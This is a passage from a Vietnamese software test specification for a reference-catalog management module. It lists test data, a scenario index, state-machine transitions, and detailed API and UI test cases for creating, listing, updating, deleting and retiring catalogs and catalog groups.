| F-NEWCAT | `new_catalog.xlsx` | Khuôn chuẩn kèm sheet `ThuocTinh` khai báo thuộc tính cho chế độ CREATE_CATALOG | | TS-07-09 |
| F-DVHC-CONV | `ma_dvhc_cu.csv` | 1.000 mã ĐVHC cũ (giả lập và chính thức) cần chuyển | | TS-07-17 |

### 2.6. Dữ liệu cho đồng bộ quốc gia và di trú

WireMock giả lập dịch vụ DMDC quốc gia (qua PH-14) có các trạng thái kịch bản sau. Mỗi trạng thái trả một "phiên bản từ xa" (`remote_version`) khác nhau để kiểm thử phát hiện thay đổi.

| Trạng thái | Nội dung trả cho danh mục `GIOI_TINH` (và `DAN_TOC` khi ghi rõ) | Phân loại mong đợi |
|---|---|---|
| `BASE` | Giống hệt phiên bản hiện hành | Không đổi (`NO_CHANGE`) |
| `ADDED_5` | `DAN_TOC` thêm 5 mã `56`…`60` | Không phá vỡ |
| `RENAMED_2` | `GIOI_TINH` đổi tên 2 bản ghi | Không phá vỡ |
| `REMOVED_1` | `GIOI_TINH` mất mã `3` | Phá vỡ |
| `ATTR_TYPE_CHANGED` | `DAN_TOC` đổi kiểu thuộc tính `ten_khac` thành INTEGER | Phá vỡ |
| `HTTP_500` | Lỗi máy chủ | Lần chạy `FAILED`, ERR-07-028 |
| `TIMEOUT` | Trễ 65 giây (vượt thời gian chờ 30 giây) | Lần chạy `FAILED`, ERR-07-028 |
| `MALFORMED` | JSON thiếu trường bắt buộc | Lần chạy `FAILED` |

Dữ liệu di trú Aita được dựng trên MySQL 8 trong Testcontainers theo đúng lược đồ bốn bảng của hệ cũ (`category`, `category_fields`, `category_details`, `category_details_value`). Bộ mồi `aita_seed.sql` gồm: 40 danh mục, trong đó 1 danh mục có giá trị dài 2.000 ký tự (đúng giới hạn `varchar(2000)` cũ), 1 danh mục có hai bản ghi mã chỉ khác hoa thường và khoảng trắng đầu cuối (" ab01" và "AB01"), 1 danh mục có thuộc tính trạng thái ẩn (`status = 0`) và thứ tự `Order` không liên tục, 1 danh mục `Is_update = 1` (từ NGSP), 1 danh mục tên trùng tên một danh mục COMMON, 1 danh mục rỗng (không bản ghi), 1 danh mục có giá trị chứa ký tự điều khiển và emoji, tổng 12.345 bản ghi và 61.725 giá trị. Không có dữ liệu cá nhân thật trong bộ mồi.

### 2.7. Nguyên tắc dữ liệu

Mọi ca kiểm thử tạo dữ liệu mới phải dùng mã có tiền tố `TC{nnn}_` (ví dụ `TC015_DM_A`) để dọn dẹp được và không va chạm giữa các ca chạy song song. Ca kiểm thử chạy song song không được sửa danh mục dùng chung của bộ dữ liệu chuẩn; ca nào cần sửa (ví dụ phát hành `LOAI_HINH_TC`) phải chạy trong nhóm tuần tự `@Isolated` hoặc trên bản sao danh mục tạo bằng chế độ CREATE_CATALOG. Đồng hồ hệ thống trong IT được điều khiển bằng `Clock` tiêm vào (múi giờ `Asia/Ho_Chi_Minh`); ngày "hôm nay" mặc định của bộ dữ liệu là 2026-11-21.

## 3. Tổng quan kịch bản kiểm thử

### 3.1. Danh sách kịch bản

Các kịch bản được nhóm theo chức năng của phân hệ và theo các mối quan tâm xuyên suốt (đa tenant, phân quyền, bộ đệm, phi chức năng). Bảng sau là mục lục kịch bản; chi tiết mục tiêu, tiền điều kiện và test case của từng kịch bản ở mục 4 và mục 5.

| Mã | Tên kịch bản | FR chính | UC | Dải TC |
|---|---|---|---|---|
| TS-07-01 | Quản lý danh mục: liệt kê, xem, tạo, sửa, xóa, ngừng hiệu lực | 001–004, 009 | UC-07-01, UC-07-14 | TC-07-001…018 |
| TS-07-02 | Nhóm danh mục | 010 | — | TC-07-019…023 |
| TS-07-03 | Lược đồ thuộc tính động và phân cấp | 005–007 | UC-07-01 | TC-07-024…038 |
| TS-07-04 | Nguồn danh mục, quyền cập nhật, mở rộng HYBRID | 008, 048 | UC-07-17 | TC-07-039…046 |
| TS-07-05 | Bản nháp và bản ghi | 011–013, 017–019 | UC-07-02 | TC-07-047…066 |
| TS-07-06 | So sánh phiên bản và phân loại thay đổi phá vỡ | 014 | UC-07-06 | TC-07-067…071 |
| TS-07-07 | Trình duyệt, duyệt, từ chối, phát hành (máy trạng thái phiên bản) | 015, 016 | UC-07-06, UC-07-07 | TC-07-072…092 |
| TS-07-08 | Tệp mẫu và nhập tệp theo chế độ | 020, 021 | UC-07-03 | TC-07-093…110 |
| TS-07-09 | Nhập tệp: định dạng, mã hóa, khuôn Aita, tạo danh mục từ tệp, tệp bất thường | 021, 022 | UC-07-04 | TC-07-111…124 |
| TS-07-10 | Nhập bản ghi qua API theo lô, idempotency | 023 | UC-07-05 | TC-07-125…130 |
| TS-07-11 | Xuất danh mục và lịch sử tác vụ | 024, 025 | UC-07-08 | TC-07-131…137 |
| TS-07-12 | Tra cứu khai thác qua API | 026–031, 033 | UC-07-09 | TC-07-138…156 |
| TS-07-13 | Truy vấn có cấu trúc (DSL) | 032 | UC-07-10 | TC-07-157…170 |
| TS-07-14 | Sự kiện và outbox | 034 | — | TC-07-171…176 |
| TS-07-15 | Đồng bộ danh mục quốc gia (máy trạng thái lần đồng bộ) | 035–039 | UC-07-11 | TC-07-177…190 |
| TS-07-16 | Hệ thống mã, ánh xạ và chuyển mã | 040–043 | UC-07-13 | TC-07-191…199 |
| TS-07-17 | ĐVHC: sắp xếp, chuyển mã, tra theo thời điểm, dòng lịch sử | 044–047 | UC-07-12 | TC-07-200…213 |
| TS-07-18 | Danh mục COMMON, PLATFORM và nạp gói nền | 048, 049 | UC-07-15 | TC-07-214…219 |
| TS-07-19 | Rò rỉ chéo tenant trên mọi nhóm API | FR-00-011 | — | TC-07-220…233 |
| TS-07-20 | Ma trận phân quyền PERM-07 × vai trò, bốn mắt, phạm vi tổ chức, scope máy | FR-00-071, D02-08 | — | TC-07-234…255 |
| TS-07-21 | Kiểm toán và lịch sử | 050 | — | TC-07-256…259 |
| TS-07-22 | Di trú dữ liệu Aita | 051 | UC-07-16 | TC-07-260…267 |
| TS-07-23 | Khai thác danh mục RESTRICTED | 052 | — | TC-07-268…271 |
| TS-07-24 | Tham số PH-07 theo tenant | 053 | — | TC-07-272…274 |
| TS-07-25 | Bộ đệm, ảnh chụp và chịu lỗi | 028, NFR-07-009, 010 | — | TC-07-275…282 |
| TS-07-26 | Giao diện E2E và yêu cầu dùng chung FR-00 | 018, FR-00-0xx | Nhiều | TC-07-283…292 |
| TS-07-27 | Hiệu năng (k6) | NFR-07-001…009, 011, 012 | — | TC-07-293…303 |
| TS-07-28 | Bảo mật (ASVS) | — | — | TC-07-304…315 |
| TS-07-29 | Khả năng truy cập | FR-00, WCAG 2.1 AA | — | TC-07-316…320 |
| TS-07-30 | Nghiệm thu người dùng (UAT) tương đương hệ Aita | LGC-DMDC | — | UAT-01…15 (mục 7) |

### 3.2. Máy trạng thái được kiểm thử

PH-07 có năm máy trạng thái. Kiểm thử phủ mọi chuyển trạng thái hợp lệ và các chuyển không hợp lệ có rủi ro nghiệp vụ cao (sửa phiên bản đã phát hành, commit tác vụ đã hết hạn, xác nhận lần đồng bộ đã áp dụng). Bảng sau tổng hợp chuyển trạng thái và test case phủ; trạng thái tác vụ nhập được hiểu theo mô hình `PENDING` → `SCANNING` → `PARSING` → `VALIDATED` → `COMMITTING` → `COMMITTED` cùng các trạng thái kết thúc `FAILED`, `CANCELLED`, `EXPIRED`, bám theo khung chung và DD-12 (bổ sung `SCANNING`).

> **Câu hỏi mở Q07-75:** Tên chính xác của các trạng thái tác vụ nhập (`PENDING`, `COMMITTING`, `EXPIRED`) chưa được khung chung liệt kê đầy đủ; tài liệu này giả định như trên và cần đối chiếu với SDD/CSDL PH-07 khi ban hành. Nếu SDD dùng tên khác, chỉ cần đổi nhãn trong các ca TC-07-093…124, logic kiểm thử không đổi.

| Máy trạng thái | Chuyển | Hợp lệ | Test case |
|---|---|---|---|
| Phiên bản | (tạo) → `DRAFT` | Có | TC-07-047 |
| Phiên bản | `DRAFT` → `IN_REVIEW` (submit) | Có | TC-07-072 |
| Phiên bản | `IN_REVIEW` → `APPROVED` (approve) | Có | TC-07-073 |
| Phiên bản | `APPROVED` → `PUBLISHED` (publish) | Có | TC-07-074 |
| Phiên bản | `IN_REVIEW` → `DRAFT` (reject) | Có | TC-07-076 |
| Phiên bản | `DRAFT` → `PUBLISHED` (phát hành trực tiếp) | Có khi `require_approval = false` và không vi phạm BR-07-012 | TC-07-084 |
| Phiên bản | `DRAFT` → `DISCARDED` | Có | TC-07-064 |
| Phiên bản | `PUBLISHED` → sửa bất kỳ | Không | TC-07-079, TC-07-080 |
| Phiên bản | `IN_REVIEW`/`APPROVED` → sửa bản ghi | Không | TC-07-081 |
| Phiên bản | `DISCARDED` → submit | Không | TC-07-082 |
| Phiên bản | `DRAFT` → approve (bỏ qua submit) khi `require_approval = true` | Không | TC-07-083 |
| Phiên bản | `IN_REVIEW`/`APPROVED`/`PUBLISHED` → hủy | Không | TC-07-065 |
| Danh mục | (tạo) → `DRAFT` | Có | TC-07-005 |
| Danh mục | `DRAFT` → `ACTIVE` (phát hành lần đầu) | Có | TC-07-075 |
| Danh mục | `ACTIVE` → `RETIRED` | Có | TC-07-013 |
| Danh mục | `DRAFT` → xóa mềm | Có | TC-07-011 |
| Danh mục | `ACTIVE` → xóa | Không | TC-07-012 |
| Danh mục | `RETIRED` → tạo bản nháp mới | Không | TC-07-016 |
| Danh mục | `DRAFT` → retire | Không | TC-07-017 |
| Bản ghi | (thêm) → `ACTIVE` | Có | TC-07-050 |
| Bản ghi | `ACTIVE` → `DEPRECATED` (kèm mã thay thế) | Có | TC-07-055 |
| Bản ghi | `DEPRECATED` → `ACTIVE` (khôi phục trong bản nháp mới) | Có | TC-07-057 |
| Bản ghi | đã phát hành → xóa | Không | TC-07-058 |
| Tác vụ nhập | `PENDING` → `SCANNING` → `PARSING` → `VALIDATED` | Có | TC-07-095 |
| Tác vụ nhập | `VALIDATED` → `COMMITTING` → `COMMITTED` | Có | TC-07-095 |
| Tác vụ nhập | `SCANNING` → `FAILED` (tệp nhiễm) | Có | TC-07-119 |
| Tác vụ nhập | `PARSING` → `FAILED` (tệp hỏng) | Có | TC-07-115 |
| Tác vụ nhập | `VALIDATED` → `CANCELLED` | Có | TC-07-107 |
| Tác vụ nhập | `VALIDATED` → `EXPIRED` (sau 24 giờ) | Có | TC-07-104 |
| Tác vụ nhập | `COMMITTED`/`EXPIRED`/`CANCELLED` → commit | Không | TC-07-104, TC-07-106, TC-07-108 |
| Tác vụ nhập | `COMMITTING` → `FAILED` (lỗi giữa chừng, hoàn tác) | Có | TC-07-110 |
| Lần đồng bộ | `RUNNING` → `NO_CHANGE` | Có | TC-07-179 |
| Lần đồng bộ | `RUNNING` → `APPLIED` (tự áp dụng) | Có | TC-07-180 |
| Lần đồng bộ | `RUNNING` → `PENDING_CONFIRMATION` | Có | TC-07-182 |
| Lần đồng bộ | `PENDING_CONFIRMATION` → `APPLIED` (accept) | Có | TC-07-183 |
| Lần đồng bộ | `PENDING_CONFIRMATION` → `REJECTED` | Có | TC-07-184 |
| Lần đồng bộ | `RUNNING` → `FAILED` | Có | TC-07-186 |
| Lần đồng bộ | `APPLIED`/`REJECTED`/`NO_CHANGE` → accept/reject | Không | TC-07-185 |

## 4. Kịch bản và test case chức năng

### TS-07-01 · Quản lý danh mục: liệt kê, xem, tạo, sửa, xóa, ngừng hiệu lực

**Mục tiêu.** Kịch bản này xác nhận vòng đời của thực thể danh mục (`catalog`) từ khi tạo tới khi xóa (nếu chưa phát hành) hoặc ngừng hiệu lực (nếu đã phát hành), cùng các màn liệt kê và xem chi tiết. Đây là nhóm chức năng thay thế trực tiếp các mục LGC-DMDC-001, 003, 004, 009, 012 của hệ Aita nên được ưu tiên cao.

**Phủ.** FR-07-001, 002, 003, 004, 009; BR-07-001, 020; UC-07-01, UC-07-14; API-07-001…006; UI-07-01, 02, 03; ERR-07-001, 002, 004, 018, 022, 031, 032; EVT-07-01, 02, 03.

**Tiền điều kiện chung.** Bộ dữ liệu chuẩn mục 2 đã nạp; người dùng U-T68-TA, U-T68-DS-NV đăng nhập được; đồng hồ hệ thống 2026-11-21.

#### TC-07-001 · Liệt kê danh mục có lọc, sắp xếp và đếm số lượng
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-001 · API-07-001 · UI-07-01 · LGC-DMDC-001
- **Tiền điều kiện / dữ liệu** T68 có 9 danh mục riêng (CAT-DT68, CAT-LH, CAT-MUC, CAT-NHAP, CAT-RES, CAT-REF, CAT-BIG và 2 danh mục khác); COMMON có 4 danh mục. Người gọi U-T68-VW.
- **Bước**
  1. Gọi `GET /catalogs?page=0&size=20&sort=code,asc`.
  2. Gọi `GET /catalogs?sourceType=LOCAL&status=ACTIVE`.
  3. Gọi `GET /catalogs?q=loai hinh` (không dấu).
  4. Gọi `GET /catalogs?classification=RESTRICTED`.
- **Mong đợi** Bước 1 trả `200`, `totalElements` = 13 (9 của T68 cộng 4 COMMON hiển thị kèm nhãn nguồn `COMMON`), danh sách sắp theo mã tăng dần, không có danh mục nào của T01 hoặc đã xóa mềm. Bước 2 chỉ trả danh mục LOCAL đang ACTIVE (không có `DM_THU_NGHIEM` vì đang DRAFT). Bước 3 trả `LOAI_HINH_TC` (tìm không dấu theo FR-00-020). Bước 4 trả đúng `TRAM_QUAN_TRAC`. Mỗi phần tử có `code`, `name`, `sourceType`, `status`, `classification`, `currentVersionNo`, `itemCount`. KT: không. EVT: không.

#### TC-07-002 · Liệt kê với tham số phân trang hoặc bộ lọc không hợp lệ
- **Loại** Âm, Biên · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-001 · API-07-001 · FR-00-021
- **Tiền điều kiện / dữ liệu** Người gọi U-T68-VW.
- **Bước**
  1. Gọi `GET /catalogs?size=200` (biên trên).
  2. Gọi `GET /catalogs?size=201`.
  3. Gọi `GET /catalogs?status=ARCHIVED` (giá trị không có trong miền).
  4. Gọi `GET /catalogs?sort=drop_table,asc` (trường sắp xếp không cho phép).
- **Mong đợi** Bước 1 trả `200`. Bước 2, 3, 4 trả `400` dạng `application/problem+json`, có trường `errors` chỉ rõ tham số sai, không lộ thông điệp SQL. KT: không.

#### TC-07-003 · Xem chi tiết danh mục phân cấp
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-002 · API-07-003, 011, 022, 026 · UI-07-02 · LGC-DMDC-003
- **Tiền điều kiện / dữ liệu** CAT-LH đã phát hành v1; người gọi U-T68-VW.
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC`.
  2. Gọi `GET /catalogs/LOAI_HINH_TC/versions`.
  3. Gọi `GET /catalogs/LOAI_HINH_TC/versions/current/attributes`.
  4. Gọi `GET /catalogs/LOAI_HINH_TC/versions/current/items?page=0&size=50`.
  5. Trên giao diện, mở UI-07-02 của danh mục, lần lượt bấm các tab Tổng quan, Bản ghi, Thuộc tính, Phiên bản.
- **Mong đợi** Bước 1 trả `200` với `isHierarchical = true`, `maxDepth = 3`, `levelNames` = `["Khối","Loại","Phân loại"]`, `ETag` khớp `version`. Bước 2 liệt kê v1 `PUBLISHED` có nhãn tính toán "Đang hiệu lực". Bước 3 trả 5 thuộc tính theo `sortOrder`. Bước 4 trả 39 bản ghi, mỗi bản ghi có `depth`, `path`, `levelName`. Giao diện hiển thị đúng số liệu, tab Ánh xạ, Đồng bộ chỉ hiện khi có dữ liệu hoặc quyền tương ứng. KT: không.

#### TC-07-004 · Xem chi tiết danh mục không tồn tại
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-002 · API-07-003 · ERR-07-001
- **Tiền điều kiện / dữ liệu** Người gọi U-T68-VW.
- **Bước**
  1. Gọi `GET /catalogs/KHONG_TON_TAI`.
  2. Gọi `GET /catalogs/DM_DA_XOA` (danh mục đã bị xóa mềm trước đó ở TC-07-011).
- **Mong đợi** Cả hai trả `404`, `code` = `ERR-07-001`, thông điệp tiếng Việt "Không tìm thấy danh mục", có `traceId`. KT: không.

#### TC-07-005 · Tạo danh mục thủ công kèm thuộc tính ban đầu
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-003, 005, 007 · BR-07-001 · API-07-002 · UI-07-03 · UC-07-01 · EVT-07-01 · LGC-DMDC-004
- **Tiền điều kiện / dữ liệu** Người gọi U-T68-DS-NV; mã `TC005_CAP_DO`.
- **Bước**
  1. Gọi `POST /catalogs` với `Idempotency-Key: k-005`, thân `{"code":"tc005_cap_do","name":"Cấp độ hồ sơ","sourceType":"LOCAL","classification":"PUBLIC","isHierarchical":false,"requireApproval":true,"ownerOrgId":"<ORG-SNV>","attributes":[{"code":"mo_ta","label":"Mô tả","dataType":"TEXT"},{"code":"so_ngay","label":"Số ngày xử lý","dataType":"INTEGER","minValue":0,"queryable":true}]}`.
  2. Gọi `GET /catalogs/TC005_CAP_DO` và `GET /catalogs/TC005_CAP_DO/versions`.
  3. Đọc bảng `ph07_rdm.outbox` và topic `t68.rdm.catalog.created.v1`.
- **Mong đợi** Bước 1 trả `201`, header `Location` trỏ `/catalogs/TC005_CAP_DO`, mã được chuẩn hóa thành chữ hoa. Bước 2 cho `status = DRAFT`, có đúng một phiên bản v1 `DRAFT`, 2 thuộc tính, `tenantId` = `T68` (lấy từ token). Bước 3: đúng một sự kiện EVT-07-01 dạng CloudEvents (`type` = `vn.datahub.rdm.catalog.created.v1`, `source`, `id` duy nhất, `tenantid` = `t68`). KT: có (CREATE catalog, giá trị sau).

#### TC-07-006 · Tạo danh mục trùng mã trong cùng tenant
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-003 · BR-07-001 · API-07-002 · ERR-07-002
- **Tiền điều kiện / dữ liệu** CAT-LH tồn tại trong T68; người gọi U-T68-DS-NV.
- **Bước**
  1. Gọi `POST /catalogs` với `code` = `loai_hinh_tc` (khác hoa thường), `Idempotency-Key` mới.
- **Mong đợi** `409`, `ERR-07-002`. Không có bản ghi `catalog` mới. EVT: không. KT: có (CREATE catalog, kết quả thất bại) theo FR-00-040 nếu chính sách kiểm toán ghi cả thao tác bị từ chối nghiệp vụ.

#### TC-07-007 · Tạo danh mục trùng mã danh mục COMMON đang ACTIVE
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-003 · BR-07-001 · ERR-07-002
- **Tiền điều kiện / dữ liệu** COMMON có `GIOI_TINH` ACTIVE; người gọi U-T68-DS-NV.
- **Bước**
  1. Gọi `POST /catalogs` với `code` = `GIOI_TINH`.
  2. Gọi `POST /catalogs` với `code` = `TC007_GIOI_TINH_RIENG`.
- **Mong đợi** Bước 1 trả `409` `ERR-07-002` (chi tiết nêu trùng với danh mục dùng chung). Bước 2 trả `201`. EVT: chỉ một EVT-07-01 cho bước 2.

#### TC-07-008 · Gửi lại yêu cầu tạo với cùng Idempotency-Key và cùng nội dung
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-003 · API-07-002 · D03-01 §7.2
- **Tiền điều kiện / dữ liệu** Đã chạy TC-07-005 với `k-005`.
- **Bước**
  1. Gửi lại nguyên văn yêu cầu bước 1 của TC-07-005 trong vòng 24 giờ.
- **Mong đợi** `201` (hoặc `200` kèm header `Idempotency-Replayed: true` theo D03-04), thân phản hồi giống lần đầu; không có danh mục thứ hai; không có EVT-07-01 thứ hai; không có bản ghi kiểm toán thứ hai.

#### TC-07-009 · Dùng lại Idempotency-Key với nội dung khác
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-003 · ERR-07-022
- **Tiền điều kiện / dữ liệu** Đã chạy TC-07-005 với `k-005`.
- **Bước**
  1. Gọi `POST /catalogs` với `Idempotency-Key: k-005` nhưng `name` = "Tên khác".
- **Mong đợi** `409`, `ERR-07-022`. Danh mục `TC005_CAP_DO` giữ nguyên tên. EVT: không.

#### TC-07-010 · Cập nhật thông tin danh mục với If-Match đúng
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-004 · API-07-004 · UI-07-03 · EVT-07-02 · LGC-DMDC-009
- **Tiền điều kiện / dữ liệu** CAT-LH ACTIVE, `ETag` = `"7"`; người gọi U-T68-DS-NV (cùng tổ chức chủ quản).
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC`, lấy `ETag`.
  2. Gọi `PATCH /catalogs/LOAI_HINH_TC` với `If-Match: "7"`, thân `{"name":"Loại hình tổ chức (sửa)","description":"Mô tả mới"}`.
- **Mong đợi** `200`, `ETag` mới `"8"`; tên mới hiển thị ở UI-07-01; nội dung phiên bản đã phát hành không đổi (tên danh mục là thông tin của thực thể danh mục, không thuộc ảnh chụp phiên bản). EVT-07-02 phát một lần với danh sách trường đổi. KT: có (UPDATE catalog, giá trị trước và sau).

#### TC-07-011 · Xóa danh mục chưa từng phát hành
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-009 · API-07-005 · UI-07-02 · UC-07-14 · LGC-DMDC-012 · FR-00-050, 051
- **Tiền điều kiện / dữ liệu** CAT-NHAP (`DM_THU_NGHIEM`, `DRAFT`); người gọi U-T68-TA.
- **Bước**
  1. Trên UI-07-02 bấm "Xóa danh mục"; hộp xác nhận hiện, nhập lại mã danh mục để xác nhận.
  2. Gọi tương đương `DELETE /catalogs/DM_THU_NGHIEM` với `If-Match`.
  3. Gọi `GET /catalogs/DM_THU_NGHIEM`.
- **Mong đợi** Bước 2 trả `204`. `catalog.deleted_at` có giá trị, phiên bản nháp chuyển `DISCARDED`. Bước 3 trả `404` `ERR-07-001`. Mã `DM_THU_NGHIEM` có thể dùng lại để tạo danh mục mới (chỉ mục duy nhất loại trừ bản ghi đã xóa mềm). KT: có (DELETE catalog). EVT: không có EVT-07-03 (xóa danh mục chưa phát hành không phát sự kiện cho bên khai thác).

#### TC-07-012 · Không cho xóa danh mục đã phát hành
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-009 · API-07-005 · ERR-07-004
- **Tiền điều kiện / dữ liệu** CAT-MUC ACTIVE; người gọi U-T68-TA.
- **Bước**
  1. Gọi `DELETE /catalogs/MUC_DO_DVC` với `If-Match` đúng.
- **Mong đợi** `409`, `ERR-07-004` với chi tiết gợi ý "Danh mục đã phát hành, hãy dùng chức năng ngừng hiệu lực". Danh mục giữ nguyên. Trên UI-07-02 nút "Xóa" không hiển thị với danh mục ACTIVE (FR-00-053).

> **Câu hỏi mở Q07-76:** Khung chung không có mã lỗi riêng cho "danh mục không ở trạng thái cho phép thao tác" (xóa danh mục ACTIVE, ngừng hiệu lực danh mục DRAFT). Tài liệu này tạm dùng `ERR-07-004` cho TC-07-012 và TC-07-017; đề nghị luồng API cân nhắc cấp mã riêng (ví dụ ERR-07-040) và cập nhật hai ca này.

#### TC-07-013 · Ngừng hiệu lực danh mục đã phát hành
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-009 · API-07-006 · UC-07-14 · EVT-07-03 · LGC-DMDC-012
- **Tiền điều kiện / dữ liệu** Danh mục `TC013_DM` ACTIVE (tạo và phát hành trong bước chuẩn bị), không bị tham chiếu; người gọi U-T68-TA.
- **Bước**
  1. Gọi `POST /catalogs/TC013_DM:retire` với thân `{"reason":"Hết căn cứ pháp lý","effectiveDate":"2026-12-01"}`.
  2. Gọi `GET /catalogs/TC013_DM`.
- **Mong đợi** Bước 1 trả `200`; `status = RETIRED`; phiên bản hiện hành có `effective_to` = 2026-12-01. EVT-07-03 phát một lần (có `reason`, `effectiveDate`). Con trỏ phiên bản hiệu lực trong bộ đệm bị vô hiệu. KT: có (RETIRE catalog, lý do).

#### TC-07-014 · Không ngừng hiệu lực danh mục đang được tham chiếu
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-009 · BR-07-020 · ERR-07-032
- **Tiền điều kiện / dữ liệu** CAT-REF ACTIVE có thuộc tính CATALOG_REF trỏ `LOAI_HINH_TC`; người gọi U-T68-TA.
- **Bước**
  1. Gọi `POST /catalogs/LOAI_HINH_TC:retire` với lý do hợp lệ.
- **Mong đợi** `409`, `ERR-07-032`, chi tiết liệt kê danh mục tham chiếu `LINH_VUC_TTHC`. `LOAI_HINH_TC` vẫn ACTIVE. EVT: không.

#### TC-07-015 · Tra cứu danh mục đã ngừng hiệu lực
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-009, 026 · ERR-07-031 · BR-07-008
- **Tiền điều kiện / dữ liệu** `TC013_DM` RETIRED từ 2026-12-01; đồng hồ đặt 2026-12-02; người gọi APP-T68-READ.
- **Bước**
  1. Gọi `GET /catalogs/TC013_DM/items/A01`.
  2. Gọi `GET /catalogs/TC013_DM/items/A01?at=2026-11-25`.
- **Mong đợi** Bước 1 trả `410`, `ERR-07-031`. Bước 2 trả `200` với bản ghi theo phiên bản hiệu lực tại 2026-11-25 (dữ liệu lịch sử vẫn tra được).

#### TC-07-016 · Không tạo bản nháp mới cho danh mục RETIRED
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-009, 011 · API-07-012 · ERR-07-031
- **Tiền điều kiện / dữ liệu** `TC013_DM` RETIRED; người gọi U-T68-DS-NV.
- **Bước**
  1. Gọi `POST /catalogs/TC013_DM/versions`.
- **Mong đợi** `410`, `ERR-07-031`. Không có phiên bản mới.

#### TC-07-017 · Không ngừng hiệu lực danh mục chưa phát hành
- **Loại** Âm · **Ưu tiên** P3 · **Tự động** API
- **Truy vết** FR-07-009 · API-07-006 · ERR-07-004
- **Tiền điều kiện / dữ liệu** Danh mục `TC017_DM` DRAFT; người gọi U-T68-TA.
- **Bước**
  1. Gọi `POST /catalogs/TC017_DM:retire`.
- **Mong đợi** `409`, `ERR-07-004` (xem Q07-76), gợi ý dùng xóa. Trạng thái giữ `DRAFT`.

#### TC-07-018 · Cập nhật thông tin danh mục với ETag cũ
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-004 · API-07-004 · ERR-07-018 · FR-00-052
- **Tiền điều kiện / dữ liệu** CAT-LH có `ETag` `"8"` sau TC-07-010; người gọi U-T68-DS-NV.
- **Bước**
  1. Gọi `PATCH /catalogs/LOAI_HINH_TC` với `If-Match: "7"`.
  2. Gọi `PATCH /catalogs/LOAI_HINH_TC` không có `If-Match`.
  3. Trên giao diện: mở UI-07-03 ở hai tab trình duyệt, lưu tab 1, rồi lưu tab 2.
- **Mong đợi** Bước 1 trả `412`, `ERR-07-018`. Bước 2 trả `428 Precondition Required` theo quy ước D03-01 §7.2. Bước 3: tab 2 hiển thị hộp thoại xung đột có khác biệt, cho chọn "Tải lại" hoặc "Ghi đè" (FR-00-052). Dữ liệu không bị ghi đè âm thầm.

### TS-07-02 · Nhóm danh mục

**Mục tiêu.** Xác nhận cây nhóm danh mục (EN-07-01) hiển thị ở khung trái UI-07-01 được tạo, sửa, xóa đúng và không cho xóa nhóm còn danh mục. Đây là chức năng mới mức S, không có trong hệ Aita.

**Phủ.** FR-07-010; API-07-007…010; UI-07-01; ERR-07-037.

**Tiền điều kiện chung.** T68 có nhóm `HANH_CHINH` chứa CAT-LH, CAT-MUC và nhóm con `HANH_CHINH.TO_CHUC` rỗng. Người gọi U-T68-TA.

#### TC-07-019 · Tạo nhóm con và xem cây nhóm
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API, E2E
- **Truy vết** FR-07-010 · API-07-007, 008 · UI-07-01
- **Tiền điều kiện / dữ liệu** Như chung.
- **Bước**
  1. Gọi `POST /catalog-groups` thân `{"code":"TC019_NHOM","name":"Nhóm thử","parentId":"<id HANH_CHINH>","sortOrder":5}`.
  2. Gọi `GET /catalog-groups`.
  3. Trên UI-07-01, mở rộng nút "Hành chính" ở khung trái.
- **Mong đợi** Bước 1 trả `201`. Bước 2 trả cây có `TC019_NHOM` dưới `HANH_CHINH`, sắp theo `sortOrder`, mỗi nút có số danh mục. Giao diện hiển thị nhóm mới, bấm vào lọc bảng danh mục theo nhóm (FR-07-001). KT: có (CREATE catalog_group).

#### TC-07-020 · Di chuyển nhóm tạo vòng trong cây nhóm
- **Loại** Âm · **Ưu tiên** P3 · **Tự động** API
- **Truy vết** FR-07-010 · API-07-009
- **Tiền điều kiện / dữ liệu** `HANH_CHINH` là cha của `HANH_CHINH.TO_CHUC`.
- **Bước**
  1. Gọi `PATCH /catalog-groups/<id HANH_CHINH>` với `parentId` = id của `HANH_CHINH.TO_CHUC`, `If-Match` đúng.
- **Mong đợi** `422` lỗi kiểm tra hợp lệ (chi tiết "tạo vòng trong cây nhóm"). Cây không đổi.

#### TC-07-021 · Xóa nhóm rỗng
- **Loại** Dương · **Ưu tiên** P3 · **Tự động** API
- **Truy vết** FR-07-010 · API-07-010
- **Tiền điều kiện / dữ liệu** `TC019_NHOM` rỗng.
- **Bước**
  1. Gọi `DELETE /catalog-groups/<id TC019_NHOM>`.
- **Mong đợi** `204`; nhóm không còn trong cây. KT: có (DELETE catalog_group).

#### TC-07-022 · Không xóa được nhóm còn danh mục
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-010 · API-07-010 · ERR-07-037
- **Tiền điều kiện / dữ liệu** `HANH_CHINH` chứa 2 danh mục.
- **Bước**
  1. Gọi `DELETE /catalog-groups/<id HANH_CHINH>`.
- **Mong đợi** `409`, `ERR-07-037`, chi tiết nêu số danh mục còn lại. Nhóm giữ nguyên.

#### TC-07-023 · Tạo nhóm trùng mã
- **Loại** Âm · **Ưu tiên** P3 · **Tự động** API
